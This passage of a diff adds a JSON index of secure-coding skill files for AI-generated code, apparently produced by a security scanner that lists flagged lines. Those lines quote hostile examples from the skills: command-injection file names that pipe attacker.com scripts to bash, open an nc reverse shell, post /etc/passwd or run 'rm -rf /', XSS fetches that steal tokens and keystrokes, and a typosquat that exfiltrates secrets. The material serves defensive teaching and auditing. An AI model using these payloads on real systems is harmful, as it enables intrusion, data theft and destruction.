+            "evidence": "https://",
+            "context": "- OWASP API Security Top 10 - Unrestricted Resource Consumption: https://owasp.org/API-Security/editions/2023/en/0xa4-unrestricted-resource-consumption/"
+          },
+          {
+            "type": "network-access",
+            "line": 731,
+            "evidence": "https://",
+            "context": "- Rate Limiting Best Practices: https://cloud.google.com/architecture/rate-limiting-strategies-techniques"
+          },
+          {
+            "type": "network-access",
+            "line": 732,
+            "evidence": "https://",
+            "context": "- HTTP 429 Status Code: https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/429"
+          }
+        ]
+      },
+      "capabilities": {
+        "shell": false,
+        "network": true,
+        "credentials": true,
+        "dynamic_execution": false,
+        "package_install": false
+      }
+    },
+    {
+      "path": "security-awareness/auth-vulnerabilities/SKILL.md",
+      "name": "authentication-authorization-vulnerabilities-ai-code",
+      "description": "Understand authentication and authorization defects in AI-generated code including insecure password storage, broken session management, and access control bypasses. Use this skill when you need to learn about auth vulnerabilities in AI code, understand why AI suggests MD5/plaintext passwords, recognize broken session patterns, or identify access control gaps. Triggers include \"auth vulnerabilities AI\", \"password storage AI\", \"session management\", \"broken access control\", \"authentication defects\", \"MD5 passwords\", \"session hijacking\", \"authorization bypass\".",
+      "skill_sha256": "bf10053254bdfd01cda18d3ed07472472204339bf358a4e1babe78fb36a75676",
+      "license": {
+        "spdx": "MIT",
+        "redistributable": true,
+        "status": "verified",
+        "evidence_path": "LICENSE"
+      },
+      "security": {
+        "scan_status": "review-required",
+        "risk": "medium",
+        "capabilities": {
+          "shell": false,
+          "network": true,
+          "credentials": true,
+          "dynamic_execution": false,
+          "package_install": false,
+          "filesystem_write": true,
+          "encoded_content": true
+        },
+        "findings": [
+          {
+            "type": "credential-access",
+            "line": 169,
+            "evidence": "credential",
+            "context": "- Years of credential stuffing attacks followed"
+          },
+          {
+            "type": "credential-access",
+            "line": 175,
+            "evidence": "credential",
+            "context": "- Used in credential stuffing attacks for years"
+          },
+          {
+            "type": "encoded-content",
+            "line": 213,
+            "evidence": "base64",
+            "context": "        const sessionId = Buffer.from(username + Date.now()).toString('base64');"
+          },
+          {
+            "type": "encoded-content",
+            "line": 242,
+            "evidence": "base64",
+            "context": "const sessionId = Buffer.from(username + Date.now()).toString('base64');"
+          },
+          {
+            "type": "encoded-content",
+            "line": 397,
+            "evidence": "base64",
+            "context": "- crypto.randomBytes() less common than Buffer/base64"
+          },
+          {
+            "type": "encoded-content",
+            "line": 415,
+            "evidence": "base64",
+            "context": "sessionId = Buffer.from(\"john_doe\" + \"1704067200000\").toString('base64');"
+          },
+          {
+            "type": "network-access",
+            "line": 428,
+            "evidence": "https://",
+            "context": "  fetch('https://attacker.com/steal?session=' + sessionId);"
+          },
+          {
+            "type": "filesystem-write",
+            "line": 625,
+            "evidence": "delete",
+            "context": "app.delete('/api/post/:id', async (req, res) => {"
+          },
+          {
+            "type": "filesystem-write",
+            "line": 626,
+            "evidence": "delete",
+            "context": "    await db.posts.delete({ id: req.params.id });"
+          },
+          {
+            "type": "filesystem-write",
+            "line": 630,
+            "evidence": "Delete",
+            "context": "// Attack: Delete anyone's posts"
+          },
+          {
+            "type": "filesystem-write",
+            "line": 631,
+            "evidence": "DELETE",
+            "context": "DELETE /api/post/any-post-id"
+          },
+          {
+            "type": "credential-access",
+            "line": 653,
+            "evidence": "credential",
+            "context": "- **Outcome:** Password hash database stolen, years of credential stuffing attacks"
+          },
+          {
+            "type": "credential-access",
+            "line": 703,
+            "evidence": "Credential",
+            "context": "| Weak password hashing (MD5/SHA1) | 81% | Credential theft |"
+          }
+        ]
+      },
+      "capabilities": {
+        "shell": false,
+        "network": true,
+        "credentials": true,
+        "dynamic_execution": false,
+        "package_install": false
+      }
+    },
+    {
+      "path": "security-awareness/awareness-overview/SKILL.md",
+      "name": "vibe-coding-security-awareness-overview",
+      "description": "Understand the security risks inherent in AI-generated code and vibe coding. Use this skill when you need to understand why AI generates insecure code, statistics on vulnerabilities, real-world breach examples, or overall security awareness for AI-assisted development. Triggers include \"vibe coding security\", \"AI code security\", \"AI vulnerabilities\", \"security risks AI code\", \"why AI insecure\", \"AI security awareness\", \"AI generated code risks\".",
+      "skill_sha256": "12f762e0fe47b846536f332b16a723a7447b3992512bf1ed660c3d6fe84a7a95",
+      "license": {
+        "spdx": "MIT",
+        "redistributable": true,
+        "status": "verified",
+        "evidence_path": "LICENSE"
+      },
+      "security": {
+        "scan_status": "review-required",
+        "risk": "medium",
+        "capabilities": {
+          "shell": false,
+          "network": true,
+          "credentials": true,
+          "dynamic_execution": false,
+          "package_install": false,
+          "filesystem_write": false,
+          "encoded_content": false
+        },
+        "findings": [
+          {
+            "type": "credential-access",
+            "line": 115,
+            "evidence": "credential",
+            "context": "→ **See:** `information-leakage` skill for credential exposure patterns"
+          },
+          {
+            "type": "network-access",
+            "line": 401,
+            "evidence": "https://",
+            "context": "**Source:** https://github.com/derick6/secure-vibe-coding-whitepaper/blob/main/chapter1_security_risks.md"
+          }
+        ]
+      },
+      "capabilities": {
+        "shell": false,
+        "network": true,
+        "credentials": true,
+        "dynamic_execution": false,
+        "package_install": false
+      }
+    },
+    {
+      "path": "security-awareness/business-logic-flaws/SKILL.md",
+      "name": "business-logic-flaws-ai-generated-code",
+      "description": "Understand business logic vulnerabilities in AI code including race conditions, integer overflow, and calculation errors that pass functional tests but create security holes. Use this skill when you need to learn about race conditions in AI code, understand integer overflow vulnerabilities, recognize business logic security flaws, or identify calculation errors. Triggers include \"race conditions\", \"business logic vulnerabilities\", \"integer overflow\", \"race condition AI\", \"flash sale security\", \"concurrent access\", \"negative totals\", \"calculation errors\".",
+      "skill_sha256": "4beb06e19ddbcb508c3e0b46098b28cd021d0c9ecc5fec467233893681969a5d",
+      "license": {
+        "spdx": "MIT",
+        "redistributable": true,
+        "status": "verified",
+        "evidence_path": "LICENSE"
+      },
+      "security": {
+        "scan_status": "verified",
+        "risk": "none",
+        "capabilities": {
+          "shell": false,
+          "network": false,
+          "credentials": false,
+          "dynamic_execution": false,
+          "package_install": false,
+          "filesystem_write": false,
+          "encoded_content": false
+        },
+        "findings": []
+      },
+      "capabilities": {
+        "shell": false,
+        "network": true,
+        "credentials": false,
+        "dynamic_execution": false,
+        "package_install": false
+      }
+    },
+    {
+      "path": "security-awareness/information-leakage/SKILL.md",
+      "name": "information-leakage-hardcoded-secrets-ai-code",
+      "description": "Understand how AI-generated code exposes sensitive information through hardcoded credentials and verbose logging. Use this skill when you need to learn about hardcoded secrets in AI code, understand logging vulnerabilities, recognize exposed API keys, or prevent information disclosure. Triggers include \"hardcoded credentials\", \"hardcoded secrets\", \"API keys in code\", \"information leakage\", \"verbose logging\", \"exposed secrets\", \"AWS keys\", \"logging vulnerabilities\", \"sensitive data logs\".",
+      "skill_sha256": "0f1e2d63dc6eeb3b7ae6e2525d38bd4f34869a44535abe2a5485682359f92363",
+      "license": {
+        "spdx": "MIT",
+        "redistributable": true,
+        "status": "verified",
+        "evidence_path": "LICENSE"
+      },
+      "security": {
+        "scan_status": "review-required",
+        "risk": "medium",
+        "capabilities": {
+          "shell": true,
+          "network": true,
+          "credentials": true,
+          "dynamic_execution": false,
+          "package_install": false,
+          "filesystem_write": false,
+          "encoded_content": false
+        },
+        "findings": [
+          {
+            "type": "credential-access",
+            "line": 63,
+            "evidence": "API key",
+            "context": "    # ❌ VULNERABLE: API key in URL"
+          },
+          {
+            "type": "credential-access",
+            "line": 65,
+            "evidence": "api_key",
+            "context": "        f\"https://api.service.com/users/{user_id}?api_key=abc123def456\""
+          },
+          {
+            "type": "network-access",
+            "line": 65,
+            "evidence": "https://",
+            "context": "        f\"https://api.service.com/users/{user_id}?api_key=abc123def456\""
+          },
+          {
+            "type": "credential-access",
+            "line": 184,
+            "evidence": "API-Key",
+            "context": "        'X-API-Key': os.getenv('API_KEY'),"
+          },
+          {
+            "type": "credential-access",
+            "line": 184,
+            "evidence": "API_KEY",
+            "context": "        'X-API-Key': os.getenv('API_KEY'),"
+          },
+          {
+            "type": "network-access",
+            "line": 190,
+            "evidence": "https://",
+            "context": "        f\"https://api.service.com/users/{user_id}\","
+          },
+          {
+            "type": "credential-access",
+            "line": 223,
+            "evidence": "API_KEY",
+            "context": "API_KEY = \"sk_live_abc123def456\""
+          },
+          {
+            "type": "network-access",
+            "line": 238,
+            "evidence": "https://",
+            "context": "fetch(`https://api.example.com/data?key=abc123def456`)"
+          },
+          {
+            "type": "shell-execution",
+            "line": 264,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "credential-access",
+            "line": 265,
+            "evidence": "secret",
+            "context": "# Search for common secret patterns"
+          },
+          {
+            "type": "credential-access",
+            "line": 268,
+            "evidence": "api_key",
+            "context": "grep -r \"api_key.*=\" ."
+          },
+          {
+            "type": "credential-access",
+            "line": 270,
+            "evidence": "secret",
+            "context": "grep -r \"secret.*=\" ."
+          },
+          {
+            "type": "credential-access",
+            "line": 329,
+            "evidence": "process.env",
+            "context": "                env: process.env  // This could expose ALL environment variables!"
+          },
+          {
+            "type": "credential-access",
+            "line": 352,
+            "evidence": "process.env",
+            "context": "**2. Logging process.env:**"
+          },
+          {
+            "type": "credential-access",
+            "line": 354,
+            "evidence": "process.env",
+            "context": "env: process.env  // ALL environment variables"
+          },
+          {
+            "type": "credential-access",
+            "line": 390,
+            "evidence": "process.env",
+            "context": "    level: process.env.LOG_LEVEL || 'info',"
+          },
+          {
+            "type": "credential-access",
+            "line": 413,
+            "evidence": "process.env",
+            "context": "if (process.env.NODE_ENV !== 'production') {"
+          },
+          {
+            "type": "credential-access",
+            "line": 481,
+            "evidence": "process.env",
+            "context": "        if (process.env.AUDIT_LOG_ENABLED === 'true') {"
+          },
+          {
+            "type": "credential-access",
+            "line": 509,
+            "evidence": "process.env",
+            "context": "        const key = Buffer.from(process.env.AUDIT_LOG_KEY, 'hex');"
+          },
+          {
+            "type": "credential-access",
+            "line": 590,
+            "evidence": "secret",
+            "context": "    'password', 'token', 'secret', 'apiKey',"
+          },
+          {
+            "type": "credential-access",
+            "line": 590,
+            "evidence": "apiKey",
+            "context": "    'password', 'token', 'secret', 'apiKey',"
+          },
+          {
+            "type": "shell-execution",
+            "line": 634,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "network-access",
+            "line": 642,
+            "evidence": "https://",
+            "context": "NEXT_PUBLIC_CONVEX_URL=https://..."
+          },
+          {
+            "type": "credential-access",
+            "line": 659,
+            "evidence": "apiKey",
+            "context": "const apiKey = process.env.API_KEY;  // ✅ From environment"
+          },
+          {
+            "type": "credential-access",
+            "line": 659,
+            "evidence": "process.env",
+            "context": "const apiKey = process.env.API_KEY;  // ✅ From environment"
+          },
+          {
+            "type": "credential-access",
+            "line": 659,
+            "evidence": "API_KEY",
+            "context": "const apiKey = process.env.API_KEY;  // ✅ From environment"
+          },
+          {
+            "type": "credential-access",
+            "line": 660,
+            "evidence": "process.env",
+            "context": "const dbPassword = process.env.DB_PASSWORD;  // ✅ From environment"
+          },
+          {
+            "type": "credential-access",
+            "line": 663,
+            "evidence": "apiKey",
+            "context": "const apiKey = \"sk_live_abc123\";"
+          },
+          {
+            "type": "credential-access",
+            "line": 731,
+            "evidence": "credential",
+            "context": "- Log breach = credential theft"
+          },
+          {
+            "type": "credential-access",
+            "line": 737,
+            "evidence": "process.env",
+            "context": "console.log('Config:', process.env);"
+          },
+          {
+            "type": "credential-access",
+            "line": 752,
+            "evidence": "apiKey",
+            "context": "const apiKey = process.env.API_KEY;"
+          },
+          {
+            "type": "credential-access",
+            "line": 752,
+            "evidence": "process.env",
+            "context": "const apiKey = process.env.API_KEY;"
+          },
+          {
+            "type": "credential-access",
+            "line": 752,
+            "evidence": "API_KEY",
+            "context": "const apiKey = process.env.API_KEY;"
+          },
+          {
+            "type": "credential-access",
+            "line": 755,
+            "evidence": "apiKey",
+            "context": "const apiKey = \"sk_live_abc123\";"
+          },
+          {
+            "type": "shell-execution",
+            "line": 760,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "credential-access",
+            "line": 778,
+            "evidence": "process.env",
+            "context": "  const missing = requiredEnvVars.filter(v => !process.env[v]);"
+          },
+          {
+            "type": "credential-access",
+            "line": 797,
+            "evidence": "secret",
+            "context": "  /secret/i,"
+          },
+          {
+            "type": "credential-access",
+            "line": 799,
+            "evidence": "apikey",
+            "context": "  /apikey/i,"
+          },
+          {
+            "type": "credential-access",
+            "line": 848,
+            "evidence": "secret",
+            "context": "✅ **Solution:** Environment variables + redacted logging + secret scanning"
+          },
+          {
+            "type": "credential-access",
+            "line": 849,
+            "evidence": "process.env",
+            "context": "✅ **Never log:** Passwords, cards, CVV, tokens, API keys, process.env"
+          }
+        ]
+      },
+      "capabilities": {
+        "shell": false,
+        "network": true,
+        "credentials": true,
+        "dynamic_execution": false,
+        "package_install": false
+      }
+    },
+    {
+      "path": "security-awareness/injection-vulnerabilities/SKILL.md",
+      "name": "injection-vulnerabilities-ai-generated-code",
+      "description": "Understand how AI generates SQL injection, command injection, and XSS vulnerabilities. Use this skill when you need to learn about injection attack patterns in AI code, see real-world examples of injection vulnerabilities, understand why AI generates insecure database queries, or recognize vulnerable code patterns. Triggers include \"SQL injection AI\", \"command injection\", \"XSS vulnerabilities\", \"injection attacks\", \"AI database queries\", \"shell injection\", \"cross-site scripting AI code\".",
+      "skill_sha256": "c4c01ef724da49ecabc6c4efa02cbf546955943d93b98a08ce9a1e3c4c16f066",
+      "license": {
+        "spdx": "MIT",
+        "redistributable": true,
+        "status": "verified",
+        "evidence_path": "LICENSE"
+      },
+      "security": {
+        "scan_status": "review-required",
+        "risk": "high",
+        "capabilities": {
+          "shell": true,
+          "network": true,
+          "credentials": true,
+          "dynamic_execution": true,
+          "package_install": false,
+          "filesystem_write": false,
+          "encoded_content": false
+        },
+        "findings": [
+          {
+            "type": "dynamic-execution",
+            "line": 140,
+            "evidence": "exec(",
+            "context": "    exec(command, (error, stdout, stderr) => {"
+          },
+          {
+            "type": "network-access",
+            "line": 149,
+            "evidence": "curl",
+            "context": "// inputFile = \"test.jpg; curl http://attacker.com/shell.sh | bash\""
+          },
+          {
+            "type": "network-access",
+            "line": 149,
+            "evidence": "http://",
+            "context": "// inputFile = \"test.jpg; curl http://attacker.com/shell.sh | bash\""
+          },
+          {
+            "type": "shell-execution",
+            "line": 149,
+            "evidence": "sh",
+            "context": "// inputFile = \"test.jpg; curl http://attacker.com/shell.sh | bash\""
+          },
+          {
+            "type": "shell-execution",
+            "line": 149,
+            "evidence": "bash",
+            "context": "// inputFile = \"test.jpg; curl http://attacker.com/shell.sh | bash\""
+          },
+          {
+            "type": "dynamic-execution",
+            "line": 193,
+            "evidence": "exec(",
+            "context": "**1. exec() is Simpler:**"
+          },
+          {
+            "type": "dynamic-execution",
+            "line": 196,
+            "evidence": "exec(",
+            "context": "- exec() allows shell syntax (pipes, redirects)"
+          },
+          {
+            "type": "destructive-operation",
+            "line": 212,
+            "evidence": "rm -rf",
+            "context": "inputFile = \"image.jpg; rm -rf /\""
+          },
+          {
+            "type": "shell-execution",
+            "line": 212,
+            "evidence": "rm -rf",
+            "context": "inputFile = \"image.jpg; rm -rf /\""
+          },
+          {
+            "type": "destructive-operation",
+            "line": 213,
+            "evidence": "rm -rf",
+            "context": "// Executes: convert image.jpg -quality 80 output.jpg; rm -rf /"
+          },
+          {
+            "type": "shell-execution",
+            "line": 213,
+            "evidence": "rm -rf",
+            "context": "// Executes: convert image.jpg -quality 80 output.jpg; rm -rf /"
+          },
+          {
+            "type": "shell-execution",
+            "line": 219,
+            "evidence": "bash",
+            "context": "inputFile = \"image.jpg; nc attacker.com 4444 -e /bin/bash\""
+          },
+          {
+            "type": "network-access",
+            "line": 226,
+            "evidence": "curl",
+            "context": "inputFile = \"image.jpg; curl -X POST https://attacker.com/data -d @/etc/passwd\""
+          },
+          {
+            "type": "network-access",
+            "line": 226,
+            "evidence": "https://",
+            "context": "inputFile = \"image.jpg; curl -X POST https://attacker.com/data -d @/etc/passwd\""
+          },
+          {
+            "type": "dynamic-execution",
+            "line": 232,
+            "evidence": "exec(",
+            "context": "**exec() vs spawn():**"
+          },
+          {
+            "type": "dynamic-execution",
+            "line": 234,
+            "evidence": "exec(",
+            "context": "| Feature | exec() | spawn() |"
+          },
+          {
+            "type": "network-access",
+            "line": 279,
+            "evidence": "https://",
+            "context": "// comment.content = \"<script>fetch('/api/session').then(r=>r.text()).then(t=>fetch('https://attacker.com?token='+t))</script>\""
+          },
+          {
+            "type": "network-access",
+            "line": 341,
+            "evidence": "https://",
+            "context": "      fetch('https://attacker.com/steal', {"
+          },
+          {
+            "type": "credential-access",
+            "line": 351,
+            "evidence": "Credential",
+            "context": "**Attack 2: Credential Harvesting**"
+          },
+          {
+            "type": "network-access",
+            "line": 355,
+            "evidence": "https://",
+            "context": "  document.body.innerHTML += '<div style=\"position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999\"><form action=\"https://attacker.com/phish\"><h2>Session Expired - Please Login</h2><input name=\"username\"><input type="
+          },
+          {
+            "type": "network-access",
+            "line": 366,
+            "evidence": "https://",
+            "context": "    fetch('https://attacker.com/keys?key=' + e.key);"
+          },
+          {
+            "type": "dynamic-execution",
+            "line": 392,
+            "evidence": "exec(",
+            "context": "- Shell: `exec(f\"convert {filename}\")`"
+          },
+          {
+            "type": "dynamic-execution",
+            "line": 430,
+            "evidence": "exec(",
+            "context": "❌ **exec() with user input:**"
+          },
+          {
+            "type": "dynamic-execution",
+            "line": 432,
+            "evidence": "exec(",
+            "context": "exec(`command ${userInput}`)"
+          },
+          {
+            "type": "dynamic-execution",
+            "line": 433,
+            "evidence": "exec(",
+            "context": "exec(\"command \" + userInput)"
+          },
+          {
+            "type": "dynamic-execution",
+            "line": 500,
+            "evidence": "exec(",
+            "context": "  exec(`convert ${filename} output.jpg`); // VULNERABLE"
+          }
+        ]
+      },
+      "capabilities": {
+        "shell": true,
+        "network": true,
+        "credentials": true,
+        "dynamic_execution": true,
+        "package_install": false
+      }
+    },
+    {
+      "path": "security-awareness/resource-exhaustion/SKILL.md",
+      "name": "resource-exhaustion-dos-ai-generated-code",
+      "description": "Understand resource exhaustion and denial of service vulnerabilities in AI code including unbounded loops, missing rate limits, and uncontrolled resource consumption. Use this skill when you need to learn about DoS vulnerabilities in AI code, understand resource limits, recognize unbounded operations, or prevent resource exhaustion. Triggers include \"resource exhaustion\", \"DoS vulnerabilities\", \"denial of service\", \"unbounded resources\", \"API cost protection\", \"memory exhaustion\", \"uncontrolled consumption\", \"rate limiting DoS\".",
+      "skill_sha256": "a731ba12add12a38c5b4c45d96be7ff43b27d580652b7141a79ccd1a8cf5c4ab",
+      "license": {
+        "spdx": "MIT",
+        "redistributable": true,
+        "status": "verified",
+        "evidence_path": "LICENSE"
+      },
+      "security": {
+        "scan_status": "review-required",
+        "risk": "low",
+        "capabilities": {
+          "shell": true,
+          "network": true,
+          "credentials": false,
+          "dynamic_execution": false,
+          "package_install": false,
+          "filesystem_write": false,
+          "encoded_content": false
+        },
+        "findings": [
+          {
+            "type": "network-access",
+            "line": 647,
+            "evidence": "https://",
+            "context": "    fetch('https://external-api.com/data'),"
+          },
+          {
+            "type": "shell-execution",
+            "line": 683,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "network-access",
+            "line": 685,
+            "evidence": "curl",
+            "context": "curl -X POST http://localhost:3000/api/endpoint \\"
+          },
+          {
+            "type": "network-access",
+            "line": 685,
+            "evidence": "http://",
+            "context": "curl -X POST http://localhost:3000/api/endpoint \\"
+          },
+          {
+            "type": "shell-execution",
+            "line": 694,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "network-access",
+            "line": 696,
+            "evidence": "curl",
+            "context": "curl -X POST http://localhost:3000/api/process \\"
+          },
+          {
+            "type": "network-access",
+            "line": 696,
+            "evidence": "http://",
+            "context": "curl -X POST http://localhost:3000/api/process \\"
+          },
+          {
+            "type": "shell-execution",
+            "line": 704,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "network-access",
+            "line": 707,
+            "evidence": "curl",
+            "context": "    curl http://localhost:3000/api/expensive-endpoint &"
+          },
+          {
+            "type": "network-access",
+            "line": 707,
+            "evidence": "http://",
+            "context": "    curl http://localhost:3000/api/expensive-endpoint &"
+          },
+          {
+            "type": "shell-execution",
+            "line": 716,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "network-access",
+            "line": 718,
+            "evidence": "curl",
+            "context": "curl --max-time 35 http://localhost:3000/api/slow-endpoint"
+          },
+          {
+            "type": "network-access",
+            "line": 718,
+            "evidence": "http://",
+            "context": "curl --max-time 35 http://localhost:3000/api/slow-endpoint"
+          }
+        ]
+      },
+      "capabilities": {
+        "shell": false,
+        "network": true,
+        "credentials": false,
+        "dynamic_execution": false,
+        "package_install": false
+      }
+    },
+    {
+      "path": "security-awareness/supply-chain-risks/SKILL.md",
+      "name": "supply-chain-dependency-risks-ai-code",
+      "description": "Understand supply chain vulnerabilities and dependency risks in AI-generated code including outdated packages, malicious packages, and dependency confusion attacks. Use this skill when you need to learn about vulnerable dependencies in AI code, understand supply chain attacks, recognize typosquatting, or identify outdated package suggestions. Triggers include \"supply chain attacks\", \"dependency vulnerabilities\", \"outdated packages\", \"malicious npm packages\", \"typosquatting\", \"dependency confusion\", \"vulnerable dependencies AI\", \"npm security\".",
+      "skill_sha256": "47f85fba62c597acac4cabb9d4a2bc99f2b53381de927a4e493f848ec76649ce",
+      "license": {
+        "spdx": "MIT",
+        "redistributable": true,
+        "status": "verified",
+        "evidence_path": "LICENSE"
+      },
+      "security": {
+        "scan_status": "review-required",
+        "risk": "medium",
+        "capabilities": {
+          "shell": true,
+          "network": true,
+          "credentials": true,
+          "dynamic_execution": false,
+          "package_install": true,
+          "filesystem_write": false,
+          "encoded_content": false
+        },
+        "findings": [
+          {
+            "type": "package-install",
+            "line": 235,
+            "evidence": "pip install",
+            "context": "pip install reqeusts     # ❌ TYPO: Could install malicious package"
+          },
+          {
+            "type": "package-install",
+            "line": 236,
+            "evidence": "pip install",
+            "context": "pip install python-sqlite # ❌ WRONG: Should use built-in sqlite3"
+          },
+          {
+            "type": "package-install",
+            "line": 237,
+            "evidence": "pip install",
+            "context": "pip install dateutils    # ❌ WRONG: Should be python-dateutil"
+          },
+          {
+            "type": "package-install",
+            "line": 238,
+            "evidence": "pip install",
+            "context": "pip install crypto       # ❌ WRONG: Should be pycryptodome"
+          },
+          {
+            "type": "package-install",
+            "line": 239,
+            "evidence": "pip install",
+            "context": "pip install yaml         # ❌ WRONG: Should be pyyaml"
+          },
+          {
+            "type": "credential-access",
+            "line": 272,
+            "evidence": "secret",
+            "context": "               if any(s in k.lower() for s in ['key', 'secret', 'token', 'password'])}"
+          },
+          {
+            "type": "network-access",
+            "line": 275,
+            "evidence": "https://",
+            "context": "    real_requests.post('https://attacker.com/collect', json=secrets)"
+          },
+          {
+            "type": "package-install",
+            "line": 290,
+            "evidence": "pip install",
+            "context": "- Developer makes typo: `pip install reqeusts`"
+          },
+          {
+            "type": "shell-execution",
+            "line": 298,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "shell-execution",
+            "line": 299,
+            "evidence": "bash",
+            "context": "#!/bin/bash"
+          },
+          {
+            "type": "shell-execution",
+            "line": 300,
+            "evidence": "sh",
+            "context": "# secure_install.sh - Verify packages before installation"
+          },
+          {
+            "type": "network-access",
+            "line": 342,
+            "evidence": "https://",
+            "context": "            pip install \"$package\" --index-url https://pypi.org/simple/"
+          },
+          {
+            "type": "package-install",
+            "line": 342,
+            "evidence": "pip install",
+            "context": "            pip install \"$package\" --index-url https://pypi.org/simple/"
+          },
+          {
+            "type": "credential-access",
+            "line": 418,
+            "evidence": "secret",
+            "context": "const token = jwt.sign({ admin: true }, 'secret', { algorithm: 'none' });"
+          },
+          {
+            "type": "network-access",
+            "line": 433,
+            "evidence": "curl",
+            "context": "args: ['curl http://attacker.com/shell.sh | bash']"
+          },
+          {
+            "type": "network-access",
+            "line": 433,
+            "evidence": "http://",
+            "context": "args: ['curl http://attacker.com/shell.sh | bash']"
+          },
+          {
+            "type": "shell-execution",
+            "line": 433,
+            "evidence": "sh",
+            "context": "args: ['curl http://attacker.com/shell.sh | bash']"
+          },
+          {
+            "type": "shell-execution",
+            "line": 433,
+            "evidence": "bash",
+            "context": "args: ['curl http://attacker.com/shell.sh | bash']"
+          },
+          {
+            "type": "shell-execution",
+            "line": 465,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "shell-execution",
+            "line": 491,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "package-install",
+            "line": 532,
+            "evidence": "pip install",
+            "context": "pip install reqeusts      # → requests"
+          },
+          {
+            "type": "package-install",
+            "line": 533,
+            "evidence": "pip install",
+            "context": "pip install python-sqlite # → use built-in sqlite3"
+          },
+          {
+            "type": "package-install",
+            "line": 534,
+            "evidence": "pip install",
+            "context": "pip install dateutils     # → python-dateutil"
+          },
+          {
+            "type": "package-install",
+            "line": 535,
+            "evidence": "pip install",
+            "context": "pip install crypto        # → pycryptodome"
+          },
+          {
+            "type": "package-install",
+            "line": 536,
+            "evidence": "pip install",
+            "context": "pip install yaml          # → pyyaml"
+          },
+          {
+            "type": "package-install",
+            "line": 537,
+            "evidence": "pip install",
+            "context": "pip install beutifulsoup4 # → beautifulsoup4"
+          },
+          {
+            "type": "package-install",
+            "line": 538,
+            "evidence": "pip install",
+            "context": "pip install pillow-simd   # → pillow (or pillow-simd if needed)"
+          },
+          {
+            "type": "shell-execution",
+            "line": 542,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "package-install",
+            "line": 543,
+            "evidence": "npm install",
+            "context": "npm install expres        # → express"
+          },
+          {
+            "type": "package-install",
+            "line": 544,
+            "evidence": "npm install",
+            "context": "npm install reac          # → react"
+          },
+          {
+            "type": "package-install",
+            "line": 545,
+            "evidence": "npm install",
+            "context": "npm install mangodb       # → mongodb"
+          },
+          {
+            "type": "package-install",
+            "line": 546,
+            "evidence": "npm install",
+            "context": "npm install loadsh        # → lodash"
+          },
+          {
+            "type": "package-install",
+            "line": 547,
+            "evidence": "npm install",
+            "context": "npm install moment-timezone # → moment-timezone (legitimate, but check)"
+          },
+          {
+            "type": "shell-execution",
+            "line": 553,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "shell-execution",
+            "line": 572,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "network-access",
+            "line": 574,
+            "evidence": "https://",
+            "context": "@mycompany:registry=https://npm.mycompany.com"
+          },
+          {
+            "type": "shell-execution",
+            "line": 578,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "package-install",
+            "line": 581,
+            "evidence": "npm install",
+            "context": "# Double-check before npm install"
+          },
+          {
+            "type": "shell-execution",
+            "line": 594,
+            "evidence": "bash",
+            "context": "```bash"
+          },
+          {
+            "type": "shell-execution",
+            "line": 595,
+            "evidence": "sh",
+            "context": "# scripts/security-check.sh"
+          }
+        ]
+      },
+      "capabilities": {
+        "shell": true,
+        "network": true,
+        "credentials": true,
+        "dynamic_execution": false,
+        "package_install": true
+      }
+    },
+    {
+      "path": "security-headers/SKILL.md",
+      "name": "security-headers",
+      "description": "Configure security headers to defend against clickjacking, XSS, MIME confusion, and SSL stripping attacks. Use this skill when you need to set up Content-Security-Policy, X-Frame-Options, HSTS, configure middleware headers, or understand browser security features. Triggers include \"security headers\", \"CSP\", \"content security policy\", \"X-Frame-Options\", \"HSTS\", \"clickjacking\", \"MIME confusion\", \"middleware headers\".",
+      "skill_sha256": "9074c79143952e06dfcedcb03d570357d24aa7133d6cea9dca83ae43dcf5e0fa",
+      "license": {
+        "spdx": "MIT",
+        "redistributable": true,
+        "status": "verified",
+        "evidence_path": "LICENSE"
+      },
+      "security": {
+        "scan_status": "review-required",
+        "risk": "medium",
+        "capabilities": {
+          "shell": true,
+          "network": true,
+          "credentials": true,
+          "dynamic_execution": false,
+          "package_install": false,
+          "filesystem_write": true,
+          "encoded_content": true
+        },
+        "findings": [
+          {
+            "type": "credential-access",
+            "line": 50,
+            "evidence": "process.env",
+            "context": "const clerkDomain = process.env.NEXT_PUBLIC_CLERK_FRONTEND_API_URL"
+          },
+          {
+            "type": "credential-access",
+            "line": 51,
+            "evidence": "process.env",
+            "context": "  ? new URL(process.env.NEXT_PUBLIC_CLERK_FRONTEND_API_URL).origin"
+          },
+          {
+            "type": "credential-access",
+            "line": 54,
+            "evidence": "process.env",
+            "context": "const convexDomain = process.env.NEXT_PUBLIC_CONVEX_URL"
+          },
+          {
+            "type": "credential-access",
+            "line": 55,
+            "evidence": "process.env",
+            "context": "  ? new URL(process.env.NEXT_PUBLIC_CONVEX_URL).origin"
+          },
+          {
+            "type": "network-access",
+            "line": 60,
+            "evidence": "https://",
+            "context": "  `script-src 'self' 'unsafe-inline' 'unsafe-eval' ${clerkDomain} https://js.stripe.com`,"
+          },
+          {
+            "type": "network-access",
+            "line": 62,
+            "evidence": "https://",
+            "context": "  `connect-src 'self' ${clerkDomain} ${convexDomain} https://api.stripe.com`,"
+          },
+          {
+            "type": "network-access",
+            "line": 63,
+            "evidence": "https://",
+            "context": "  `frame-src 'self' ${clerkDomain} https://js.stripe.com https://hooks.stripe.com`,"
+          },
+          {
+            "type": "network-access",
+            "line": 63,
+            "evidence": "https://",
+            "context": "  `frame-src 'self' ${clerkDomain} https://js.stripe.com https://hooks.stripe.com`,"
+          },
+          {
+            "type": "credential-access",
+            "line": 84,
+            "evidence": "process.env",
